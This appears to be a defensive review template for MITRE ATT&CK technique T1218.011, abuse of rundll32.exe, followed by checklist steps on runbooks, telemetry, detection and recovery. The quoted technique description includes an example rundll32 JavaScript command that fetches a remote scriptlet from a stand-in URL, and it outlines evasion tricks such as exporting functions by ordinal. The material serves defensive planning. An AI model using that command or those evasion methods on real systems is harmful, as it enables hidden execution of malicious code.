# Rundll32 Technique Operationalization Review

## Reference

- Technique: **T1218.011 — Rundll32**

Adversaries may abuse rundll32.exe to proxy execution of malicious code. Using rundll32.exe, vice executing directly (i.e. Shared Modules), may avoid triggering security tools that may not monitor execution of the rundll32.exe process because of allowlists or false positives from normal operations. Rundll32.exe is commonly associated with executing DLL payloads (ex: <code>rundll32.exe {DLLname, DLLfunction}</code>). Rundll32.exe can also be used to execute Control Panel Item files (.cpl) through the undocumented shell32.dll functions <code>Control_RunDLL</code> and <code>Control_RunDLLAsUser</code>. Double-clicking a .cpl file also causes rundll32.exe to execute. For example, ClickOnce can be proxied through Rundll32.exe. Rundll32 can also be used to execute scripts such as JavaScript. This can be done using a syntax similar to this: <code>rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:https[:]//www[.]example[.]com/malicious.sct")"</code> This behavior has been seen used by malware such as Poweliks. Threat actors may also abuse legitimate, signed system DLLs (e.g., <code>zipfldr.dll, ieframe.dll</code>) with <code>rundll32.exe</code> to execute malicious programs or scripts indirectly, making their activity appear more legitimate and evading detection. Adversaries may also attempt to obscure malicious code from analysis by abusing the manner in which rundll32.exe loads DLL function names. As part of Windows compatibility support for various character sets, rundll32.exe will first check for wide/Unicode then ANSI character-supported functions before loading the specified function (e.g., given the command <code>rundll32.exe ExampleDLL.dll, ExampleFunction</code>, rundll32.exe would first attempt to execute <code>ExampleFunctionW</code>, or failing that <code>ExampleFunctionA</code>, before loading <code>ExampleFunction</code>). Adversaries may therefore obscure malicious code by creating multiple identical exported function names and appending <code>W</code> and/or <code>A</code> to harmless ones. DLL functions can also be exported and executed by an ordinal number (ex: <code>rundll32.exe file.dll,#1</code>). Additionally, adversaries may use Masquerading techniques (such as changing DLL file names, file extensions, or function names) to further conceal execution of a malicious payload.

## Operationalization review

1. Record the operational scope: which services, environments, and data the technique could affect.
2. Record the runbook that would be executed, and its owner.
3. Record the telemetry the runbook depends on, and whether it is retained long enough to investigate.
4. Record the detection that would surface the technique before or after it has an effect.
5. Record the recovery path, and the evidence that recovery has been rehearsed.
6. Record the residual operational risk where the runbook depends on a manual step.

## Review evidence

- the runbook and its owner;
- the telemetry retention and coverage record;
- the detection mapping;
- the exercise or rehearsal record.

## Limitations

An operationalization review describes the runbook and the evidence around it. It does not claim the technique has been prevented or detected in a live environment.

## Source

- MITRE ATT&CK: https://attack.mitre.org/
- T1218.011: https://attack.mitre.org/techniques/T1218/011
- Reviewed: 2026-10-27
